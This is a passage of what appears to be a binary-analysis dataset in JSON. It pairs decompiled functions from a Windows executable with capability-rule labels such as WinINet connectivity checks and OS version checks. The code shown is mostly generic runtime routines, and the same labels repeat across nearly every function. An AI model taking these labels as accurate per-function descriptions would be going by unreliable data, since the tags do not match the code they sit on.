        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0040105f(uint16_t *arg_8h, uint8_t *arg_ch, uint32_t arg_10h, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_4h;\n    \n    if ((arg_ch == NULL) || (arg_10h == 0)) {\n        *0x570200 = 0;\n        *0x570204 = 0;\n        return 0;\n    }\n    if (*arg_ch == 0) {\n        if (arg_8h == NULL) {\n            return 0;\n        }\n        *arg_8h = 0;\n        return 0;\n    }\n    fcn.004057e5(arg_14h);\n    if (*(var_ch + 8) == 0xfde9) {\n        iVar2 = fcn.00403d9b(arg_8h, arg_ch, arg_10h, 0x570200);\n        if (-1 < iVar2) goto code_r0x004c2700;\n    }\n    else {\n        if (*(var_ch + 0xa8) == 0) {\n            if (arg_8h != NULL) {\n                *arg_8h = *arg_ch;\n            }\n            iVar2 = 1;\n            goto code_r0x004c2700;\n        }\n        iVar2 = fcn.00405961(*arg_ch, &var_ch);\n        if (iVar2 != 0) {\n            if (*(var_ch + 4) < 2) {\ncode_r0x004c26bd:\n                uVar1 = *(var_ch + 4);\ncode_r0x004c26c0:\n                if ((arg_10h < uVar1) || (arg_ch[1] == 0)) goto code_r0x004c26f2;\n            }\n            else {\n                uVar1 = *(var_ch + 4);\n                if (arg_10h < *(var_ch + 4)) goto code_r0x004c26c0;\n                iVar2 = fcn.00401b4f(*(var_ch + 8), 9, arg_ch, *(var_ch + 4), arg_8h, arg_8h != NULL);\n                if (iVar2 == 0) goto code_r0x004c26bd;\n            }\n            iVar2 = *(var_ch + 4);\n            goto code_r0x004c2700;\n        }\n        iVar2 = 1;\n        iVar3 = fcn.00401b4f(*(var_ch + 8), 9, arg_ch, 1, arg_8h, arg_8h != NULL);\n        if (iVar3 != 0) goto code_r0x004c2700;\ncode_r0x004c26f2:\n        puVar4 = fcn.004039a4();\n        *puVar4 = 0x2a;\n    }\n    iVar2 = -1;\ncode_r0x004c2700:\n    if (var_4h != '\\0') {\n        *(var_10h + 0x350) = *(var_10h + 0x350) & 0xfffffffd;\n        return iVar2;\n    }\n    return iVar2;\n}\n",
        "token_count": 755
    },
    "00401078": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.00401078(int32_t param_1)\n\n{\n    uchar uVar1;\n    char cVar2;\n    \n    if (*(param_1 + 0x32) != 0x2a) {\n        uVar1 = fcn.004062f3(param_1 + 0x28);\n        return uVar1;\n    }\n    cVar2 = fcn.004056aa();\n    if (cVar2 == '\\0') {\n        return 0;\n    }\n    cVar2 = fcn.004058f8();\n    if ((cVar2 != '\\0') && (*(param_1 + 0x28) < 0)) {\n        *(param_1 + 0x28) = 0xffffffff;\n    }\n    return 1;\n}\n",
        "token_count": 173
    },
    "004010ff": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004010ff(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    \n    if (arg_8h != 0) {\n        uVar1 = fcn.004db3d4(arg_8h);\n        if ((-1 < uVar1) && (uVar1 < 0xe4)) {\n            return *(uVar1 * 8 + 0x554b10);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 107
    },
    "00401190": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401190(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    \n    if (*arg_8h == 0) {\n        *arg_8h = arg_ch;\n        *(arg_8h + 1) = arg_10h;\n        arg_8h[3] = arg_14h;\n    }\n    else {\n        cVar1 = fcn.00402504(arg_8h, arg_ch, arg_10h, arg_14h);\n        if (cVar1 == '\\0') {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 198
    },
    "004011c7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.004011c7(uint arg_8h)\n\n{\n    if (arg_8h == '\\0') {\n        fcn.00402784();\n        fcn.00404fa7();\n    }\n    return 1;\n}\n",
        "token_count": 55
    },
    "00401203": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401203(int32_t arg_8h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    \n    if (arg_8h == 0) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n        return 0xffffffff;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_HeapSize)(*0x5705b8, 0, arg_8h);\n    return uVar2;\n}\n",
        "token_count": 124
    },
    "00401212": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar ** __cdecl fcn.00401212(char **arg_8h)\n\n{\n    char cVar1;\n    char *pcVar2;\n    uint arg_ch;\n    char **ppcVar3;\n    uint var_18h;\n    uint var_10h;\n    char *var_8h;\n    char *var_4h;\n    \n    pcVar2 = *0x56f45c;\n    *arg_8h = NULL;\n    arg_8h[1] = NULL;\n    if (pcVar2 == NULL) {\n        return arg_8h;\n    }\n    if (*pcVar2 == '?') {\n        cVar1 = pcVar2[1];\n        if (cVar1 == '@') {\n            *0x56f458 = *0x56f458 + 2;\n            var_8h = \"CV: \";\n            var_4h = 0x4;\n            arg_ch = fcn.00401d20(&var_10h);\n            fcn.00402cfc(&var_8h);\n            fcn.004052f9(&var_8h, arg_ch);\n            *arg_8h = var_8h;\n            arg_8h[1] = var_4h;\n            return arg_8h;\n        }\n        if (cVar1 == '$') {\n            ppcVar3 = fcn.00402c98(&var_18h, 0);\n            *arg_8h = *ppcVar3;\n            pcVar2 = ppcVar3[1];\n            arg_8h[1] = pcVar2;\n            if (pcVar2 != '\\x02') {\n                if ((*0x56f460 & 0x1000) != 0) {\n                    return arg_8h;\n                }\n                if (**0x56f458 == '\\0') {\n                    return arg_8h;\n                }\n            }\n            *0x56f458 = *0x56f45c;\n            ppcVar3 = fcn.00401d20(&var_18h);\n            *arg_8h = *ppcVar3;\n            arg_8h[1] = ppcVar3[1];\n            return arg_8h;\n        }\n        if ((cVar1 == '?') && (pcVar2[2] == '@')) {\n            *(arg_8h + 1) = 2;\n            return arg_8h;\n        }\n    }\n    ppcVar3 = fcn.00401d20(&var_18h);\n    *arg_8h = *ppcVar3;\n    arg_8h[1] = ppcVar3[1];\n    return arg_8h;\n}\n",
        "token_count": 591
    },
    "00418220": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.00418220(code **param_1, int32_t param_2)\n\n{\n    code **ppcVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_1ch;\n    int32_t var_8h;\n    code **var_20h;\n    uint *puStack32;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    puStack32 = &var_20h;\n    var_14h = 0x41e2d0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    *param_1 = vtable.std::exception.0;\n    var_10h = 0;\n    var_20h = param_1;\n    fcn.00405a60(param_1 + 1);\n    ppcVar1 = var_20h;\n    if (var_8h != 0) {\n        fcn.00401e7e(var_20h);\n    }\n    *in_FS_OFFSET = var_18h;\n    return ppcVar1;\n}\n",
        "token_count": 253
    },
    "00401244": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00401244(int32_t param_1)\n\n{\n    int32_t iVar1;\n    unkuint3 Var2;\n    \n    *(param_1 + 0x458) = *(param_1 + 0x458) + 1;\n    iVar1 = *(param_1 + 0x458);\n    Var2 = iVar1 >> 8;\n    if ((iVar1 != 3) && ((iVar1 != 2 || (*(param_1 + 0x45c) != 1)))) {\n        *(param_1 + 0xaa4) = 0xffffffff;\n        *(param_1 + 0xaa8) = 0xffffffff;\n        *(param_1 + 0x45c) = 0;\n        *(param_1 + 0x24) = 0;\n        *(param_1 + 0x28) = 0;\n        *(param_1 + 0x10) = *(param_1 + 0x460);\n        return CONCAT31(Var2, 1);\n    }\n    return Var2 << 8;\n}\n",
        "token_count": 240
    },
    "004012b7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.004012b7(uint arg_8h, uint dwInfoType, uint arg_10h, uint arg_14h, uint lpCharType, int32_t arg_1ch, int32_t arg_20h\n            )\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t arg_8h_00;\n    uint *lpWideCharStr;\n    uint *puVar3;\n    uint var_28h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar3 = &stack0xffffffd0;\n    lpWideCharStr = &stack0xffffffd0;\n    fcn.004057e5(arg_8h);\n    if (arg_1ch == 0) {\n        arg_1ch = *(var_18h + 8);\n    }\n    iVar2 = fcn.00401b4f(arg_1ch, (arg_20h != 0) * 8 + 1, arg_10h, arg_14h, 0, 0);\n    if (iVar2 == 0) goto code_r0x004cb6e6;\n    uVar1 = iVar2 * 2;\n    arg_8h_00 = -(uVar1 < uVar1 + 8) & uVar1 + 8;\n    if (arg_8h_00 == 0) {\n        lpWideCharStr = NULL;\n    }\n    else if (arg_8h_00 < 0x401) {\n        fcn.0040349f();\n        if (*0x10 != 0x30) {\ncode_r0x004cb6a0:\n            lpWideCharStr = puVar3 + 2;\n        }\n    }\n    else {\n        lpWideCharStr = fcn.00403ff3(arg_8h_00);\n        if (lpWideCharStr != NULL) {\n            *lpWideCharStr = 0xdddd;\n            puVar3 = lpWideCharStr;\n            goto code_r0x004cb6a0;\n        }\n    }\n    if (lpWideCharStr != NULL) {\n        fcn.0040314d(lpWideCharStr, 0, uVar1);\n        iVar2 = fcn.00401b4f(arg_1ch, 1, arg_10h, arg_14h, lpWideCharStr, iVar2);\n        if (iVar2 != 0) {\n            (*_sym.imp.KERNEL32.dll_GetStringTypeW)(dwInfoType, lpWideCharStr, iVar2, lpCharType);\n        }\n    }\n    fcn.004013bb(lpWideCharStr);\ncode_r0x004cb6e6:\n    if (var_10h != '\\0') {\n        *(var_1ch + 0x350) = *(var_1ch + 0x350) & 0xfffffffd;\n    }\n    fcn.00403085(var_1ch);\n    return;\n}\n",
        "token_count": 725
    },
    "004b170e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_58h\n\nvoid __cdecl fcn.004b170e(uint *arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t *piVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    uchar *puVar7;\n    ushort *puVar8;\n    uint *puVar9;\n    int32_t iVar10;\n    uint *puVar11;\n    uint *puVar12;\n    uint *var_58h;\n    uint var_54h;\n    uint *var_50h;\n    uint *var_4ch;\n    ushort *var_48h;\n    uint *var_44h;\n    uchar *var_40h;\n    uint32_t var_3ch;\n    uint32_t var_38h;\n    uint *var_34h;\n    uint *var_30h;\n    uint *var_2ch;\n    uint *var_28h;\n    int32_t var_24h;\n    uint *var_20h;\n    uint *var_1ch;\n    uint32_t var_18h;\n    uint var_12h;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    var_34h = arg_8h;\n    puVar9 = NULL;\n    var_1ch = NULL;\n    var_20h = NULL;\n    var_24h = 0;\n    var_58h = arg_8h;\n    var_54h = 0;\n    if (arg_8h[0x2a] == 0) {\n        piVar2 = arg_8h[0x23];\n        if (piVar2 != NULL) {\n            LOCK();\n            *piVar2 = *piVar2 + -1;\n        }\n        arg_8h[0x23] = 0;\n        arg_8h[0x24] = 0;\n        *arg_8h = 0x550ad0;\n        arg_8h[0x25] = 0x550df0;\n        arg_8h[0x26] = 0x550fc0;\n        arg_8h[1] = 1;\n        goto code_r0x004b1b5d;\n    }\n    var_30h = NULL;\n    if ((arg_8h[2] == 0) && (iVar4 = fcn.00401acd(&var_58h, 0, arg_8h[0x2a], 0x1004, arg_8h + 2),  iVar4 != 0)) {\ncode_r0x004b1af0:\n        fcn.00406302(var_30h);\n        fcn.00406302(var_1ch);\n        fcn.00406302(puVar9);\n        fcn.00406302(var_20h);\n    }\n    else {\n        var_30h = fcn.00404fd9(1, 4);\n        fcn.00406302(0);\n        var_1ch = fcn.00404fd9(0x180, 2);\n        fcn.00406302(0);\n        puVar9 = fcn.00404fd9(0x180, 1);\n        var_28h = puVar9;\n        fcn.00406302(0);\n        var_20h = fcn.00404fd9(0x180, 1);\n        fcn.00406302(0);\n        var_24h = fcn.00404fd9(0x101, 1);\n        fcn.00406302(0);\n        if ((var_30h == NULL) || ((((var_1ch == NULL || (var_24h == 0)) || (puVar9 == NULL)) || (var_20h == NULL))))\n        goto code_r0x004b1af0;\n        iVar4 = 0;\n        do {\n            *(iVar4 + var_24h) = iVar4;\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 0x100);\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetCPInfo)(arg_8h[2], &var_18h);\n        if ((iVar4 == 0) || (5 < var_18h)) goto code_r0x004b1af0;\n        var_38h = var_18h & 0xffff;\n        if (1 < var_38h) {\n            if (arg_8h[2] == 0xfde9) {\n                fcn.0040314d(var_24h + 0x80, 0x20, 0x80);\n            }\n            else {\n                puVar6 = &var_12h;\n                uVar1 = var_12h;\n                while ((uVar1 != 0 && (arg_8h = var_34h,  *(puVar6 + 1) != 0))) {\n                    uVar5 = *puVar6;\n                    if (uVar5 <= *(puVar6 + 1)) {\n                        do {\n                            *(uVar5 + var_24h) = 0x20;\n                            uVar5 = uVar5 + 1;\n                        } while (uVar5 <= *(puVar6 + 1));\n                    }\n                    puVar6 = puVar6 + 2;\n                    uVar1 = *puVar6;\n                }\n            }\n        }\n        var_2ch = var_24h + 1;\n        iVar4 = fcn.00405d80(0, arg_8h[0x2a], 0x100, var_2ch, 0xff, puVar9 + 0x81, 0xff, arg_8h[2], 0);\n        if ((iVar4 == 0) ||\n           (iVar4 = fcn.00405d80(0, arg_8h[0x2a], 0x200, var_2ch, 0xff, var_20h + 0x81, 0xff, arg_8h[2], 0),  iVar4 == 0\n           )) goto code_r0x004b1af0;\n        var_44h = var_1ch + 0x40;\n        iVar4 = fcn.004012b7(0, 1, var_24h, 0x100, var_44h, arg_8h[2], 0);\n        puVar12 = var_28h;\n        puVar6 = var_34h;\n        if (iVar4 == 0) goto code_r0x004b1af0;\n        var_48h = var_1ch + 0xfe;\n        *var_48h = 0;\n        var_4ch = var_28h + 0x20;\n        *(var_28h + 0x7f) = 0;\n        *(var_20h + 0x7f) = 0;\n        *var_4ch = 0;\n        var_50h = var_20h + 0x20;\n        *var_50h = 0;\n        if (1 < var_38h) {\n            if (arg_8h[2] == 0xfde9) {\n                puVar9 = var_28h + 0x40;\n                iVar10 = var_20h - var_28h;\n                iVar4 = -0x142 - var_28h;\n                var_2ch = -0x80 - var_28h;\n                var_28h = var_1ch + 0x80;\n                do {\n                    puVar11 = var_28h + 2;\n                    *var_28h = (-(0x32 < iVar4 + puVar9) & 0x8000) + 0x8000;\n                    cVar3 = puVar9 + var_2ch;\n                    *puVar9 = cVar3;\n                    *(iVar10 + puVar9) = cVar3;\n                    puVar9 = puVar9 + 1;\n                    var_28h = puVar11;\n                } while (var_2ch + puVar9 < 0x100);\n            }\n            else {\n                puVar9 = &var_12h;\n                while ((var_12h != 0 && (*(puVar9 + 1) != 0))) {\n                    var_3ch = *puVar9;\n                    if (var_3ch <= *(puVar9 + 1)) {\n                        var_2ch = var_28h;\n                        var_40h = var_20h + var_3ch + 0x80;\n                        puVar8 = var_1ch + var_3ch * 2 + 0x100;\n                        uVar5 = var_3ch;\n                        puVar7 = var_40h;\n                        do {\n                            *puVar8 = 0x8000;\n                            puVar8 = puVar8 + 1;\n                            puVar7[var_28h - var_20h] = uVar5;\n                            *puVar7 = uVar5;\n                            uVar5 = uVar5 + 1;\n                            puVar7 = puVar7 + 1;\n                        } while (uVar5 <= *(puVar9 + 1));\n                    }\n                    puVar9 = puVar9 + 2;\n                    var_12h._0_1_ = *puVar9;\n                }\n            }\n        }\n        puVar9 = var_1ch + 0x80;\n        puVar11 = var_1ch;\n        for (iVar4 = 0x3f; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar11 = *puVar9;\n            puVar9 = puVar9 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        *puVar11 = *puVar9;\n        puVar9 = puVar12 + 0x40;\n        for (iVar4 = 0x1f; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar12 = *puVar9;\n            puVar9 = puVar9 + 1;\n            puVar12 = puVar12 + 1;\n        }\n        *puVar12 = *puVar9;\n        *(puVar12 + 2) = *(puVar9 + 2);\n        puVar9 = var_20h + 0x40;\n        puVar12 = var_20h;\n        for (iVar4 = 0x1f; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar12 = *puVar9;\n            puVar9 = puVar9 + 1;\n            puVar12 = puVar12 + 1;\n        }\n        *puVar12 = *puVar9;\n        *(puVar12 + 2) = *(puVar9 + 2);\n        piVar2 = var_34h[0x23];\n        if (piVar2 != NULL) {\n            LOCK();\n            iVar4 = *piVar2;\n            *piVar2 = iVar4 + -1;\n            if (iVar4 + -1 == 0) {\n                fcn.00406302(var_34h[0x24] + -0xfe);\n                fcn.00406302(puVar6[0x25] + -0x80);\n                fcn.00406302(puVar6[0x26] + -0x80);\n                fcn.00406302(puVar6[0x23]);\n            }\n        }\n        *var_30h = 1;\n        puVar6[0x23] = var_30h;\n        *puVar6 = var_44h;\n        puVar6[0x24] = var_48h;\n        puVar6[0x25] = var_4ch;\n        puVar6[0x26] = var_50h;\n        puVar6[1] = var_38h;\n    }\n    fcn.00406302(var_24h);\ncode_r0x004b1b5d:\n    fcn.00403085(var_58h);\n    return;\n}\n",
        "token_count": 2716
    },
    "00401307": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401307(int32_t param_1)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint16_t *puVar4;\n    int32_t in_stack_ffffffdc;\n    int32_t var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    if ((*(param_1 + 0x3c) == '\\0') || (*(param_1 + 0x38) < 1)) {\n        in_stack_ffffffdc = param_1 + 0xc;\n        fcn.00405df8(*(param_1 + 0x34), *(param_1 + 0x38), param_1 + 0x18, in_stack_ffffffdc);\n    }\n    else {\n        puVar4 = *(param_1 + 0x34);\n        iVar3 = 0;\n        do {\n            uVar1 = *puVar4;\n            puVar4 = puVar4 + 1;\n            var_10h = 0;\n            iVar2 = fcn.00401f32(&var_10h, &var_ch, 6, uVar1, *(param_1 + 8));\n            if ((iVar2 != 0) || (var_10h == 0)) {\n                *(param_1 + 0x18) = 0xffffffff;\n                break;\n            }\n            fcn.00405df8(&var_ch, var_10h, param_1 + 0x18, param_1 + 0xc);\n            iVar3 = iVar3 + 1;\n        } while (iVar3 != *(param_1 + 0x38));\n    }\n    fcn.00403085(in_stack_ffffffdc);\n    return;\n}\n",
        "token_count": 412
    },
    "0040134d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040134d(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t arg_ch;\n    int32_t iVar2;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    if ((*(param_1 + 0x3c) == '\\0') && (iVar2 = 0,  0 < *(param_1 + 0x38))) {\n        arg_ch = *(param_1 + 0x34);\n        do {\n            var_4h = var_4h & 0xffff0000;\n            iVar1 = fcn.0040105f(&var_4h, arg_ch, *(**(param_1 + 8) + 4), *(param_1 + 8));\n            if (iVar1 < 1) {\n                *(param_1 + 0x18) = 0xffffffff;\n                return 1;\n            }\n            fcn.004016ae(var_4h, param_1 + 0x18);\n            arg_ch = arg_ch + iVar1;\n            iVar2 = iVar2 + 1;\n        } while (iVar2 != *(param_1 + 0x38));\n    }\n    else {\n        fcn.00402937(*(param_1 + 0x34), *(param_1 + 0x38), param_1 + 0x18);\n    }\n    return 1;\n}\n",
        "token_count": 318
    },
    "00401361": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nchar * __cdecl fcn.00401361(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    char *pcVar7;\n    char *pcVar8;\n    uint32_t uVar9;\n    char *pcVar10;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.004057e5(arg_8h);\n    pcVar8 = NULL;\n    uVar9 = 0;\n    iVar2 = *(var_14h + 0x9c);\n    do {\n        pcVar7 = *(iVar2 + uVar9 * 4);\n        pcVar4 = pcVar7 + 1;\n        do {\n            cVar1 = *pcVar7;\n            pcVar7 = pcVar7 + 1;\n        } while (cVar1 != '\\0');\n        pcVar6 = *(iVar2 + 0x1c + uVar9 * 4);\n        pcVar10 = pcVar6 + 1;\n        do {\n            cVar1 = *pcVar6;\n            pcVar6 = pcVar6 + 1;\n        } while (cVar1 != '\\0');\n        pcVar8 = pcVar7 + pcVar6 + pcVar8 + (-pcVar10 - pcVar4) + 2;\n        uVar9 = uVar9 + 1;\n    } while (uVar9 < 7);\n    pcVar4 = fcn.00403ff3(pcVar8 + 1);\n    if (pcVar4 != NULL) {\n        uVar9 = 0;\n        pcVar7 = pcVar4;\n        do {\n            *pcVar7 = ':';\n            pcVar10 = pcVar7 + 1;\n            iVar5 = fcn.00405f56(pcVar10, pcVar4 + pcVar8 + (1 - pcVar10), *(iVar2 + uVar9 * 4));\n            if (iVar5 != 0) {\ncode_r0x004ba90b:\n                fcn.004035f8(0, 0, 0, 0, 0);\n                pcVar3 = swi(3);\n                pcVar8 = (*pcVar3)();\n                return pcVar8;\n            }\n            pcVar6 = pcVar10;\n            do {\n                cVar1 = *pcVar6;\n                pcVar6 = pcVar6 + 1;\n            } while (cVar1 != '\\0');\n            pcVar10 = pcVar10 + (pcVar6 - (pcVar7 + 2));\n            *pcVar10 = ':';\n            pcVar7 = pcVar10 + 1;\n            iVar5 = fcn.00405f56(pcVar7, pcVar4 + pcVar8 + (1 - pcVar7), *(iVar2 + 0x1c + uVar9 * 4));\n            if (iVar5 != 0) goto code_r0x004ba90b;\n            pcVar6 = pcVar7;\n            do {\n                cVar1 = *pcVar6;\n                pcVar6 = pcVar6 + 1;\n            } while (cVar1 != '\\0');\n            pcVar7 = pcVar7 + (pcVar6 - (pcVar10 + 2));\n            uVar9 = uVar9 + 1;\n        } while (uVar9 < 7);\n        *pcVar7 = '\\0';\n    }\n    fcn.00406302(0);\n    if (var_ch != '\\0') {\n        *(var_18h + 0x350) = *(var_18h + 0x350) & 0xfffffffd;\n    }\n    return pcVar4;\n}\n",
        "token_count": 863
    },
    "00401384": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00401384(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    char cVar1;\n    char *pcVar2;\n    code *pcVar3;\n    uchar uVar4;\n    char cVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    char *pcVar9;\n    uint32_t uVar10;\n    int32_t unaff_EBP;\n    int32_t iVar11;\n    uint32_t uVar12;\n    bool bVar13;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_28h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.0040536c(0x44);\n    pcVar2 = *(unaff_EBP + 0x14);\n    iVar11 = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x34) = *(unaff_EBP + 8);\n    cVar5 = *pcVar2;\n    *(unaff_EBP + -0x48) = *(unaff_EBP + 0xc);\n    pcVar9 = pcVar2;\n    cVar1 = cVar5;\n    while (cVar1 != '\\0') {\n        if (cVar1 == cVar5) {\n            iVar11 = iVar11 + 1;\n        }\n        pcVar9 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n    }\n    *(unaff_EBP + -0x3c) = iVar11;\n    fcn.004036e8(iVar11, 0);\n    *(unaff_EBP + -4) = 1;\n    uVar6 = fcn.00404ed5(1);\n    *(unaff_EBP + -0x4c) = uVar6;\n    *(unaff_EBP + -4) = 2;\n    uVar6 = fcn.004035a8(unaff_EBP + -0x50);\n    *(unaff_EBP + -0x38) = uVar6;\n    *(unaff_EBP + -4) = 0;\n    fcn.004050a6();\n    *(unaff_EBP + -0x40) = 0xfffffffe;\n    uVar10 = 1;\n    *(unaff_EBP + -0x30) = 1;\n    while( true ) {\n        uVar12 = 0;\n        iVar11 = 0;\n        *(unaff_EBP + -0x29) = 0;\n        *(unaff_EBP + -0x44) = 0;\n        if (*(unaff_EBP + -0x3c) == 0) break;\n        do {\n            cVar5 = pcVar2[iVar11];\n            if (cVar5 != '\\0') {\n                do {\n                    if (cVar5 == *pcVar2) break;\n                    iVar11 = iVar11 + 1;\n                    cVar5 = pcVar2[iVar11];\n                } while (cVar5 != '\\0');\n            }\n            bVar13 = 0xf < *(unaff_EBP + -0x14);\n            iVar7 = unaff_EBP + -0x28;\n            if (0xf < *(unaff_EBP + -0x14)) {\n                iVar7 = *(unaff_EBP + -0x28);\n            }\n            if (*(iVar7 + uVar12) == '\\0') {\n                iVar11 = iVar11 + uVar10;\n                if ((pcVar2[iVar11] == *pcVar2) || (pcVar2[iVar11] == '\\0')) {\n                    if (0x7e < uVar10) {\n                        uVar10 = 0x7f;\n                    }\n                    iVar7 = unaff_EBP + -0x28;\n                    if (bVar13) {\n                        iVar7 = *(unaff_EBP + -0x28);\n                    }\n                    *(iVar7 + uVar12) = 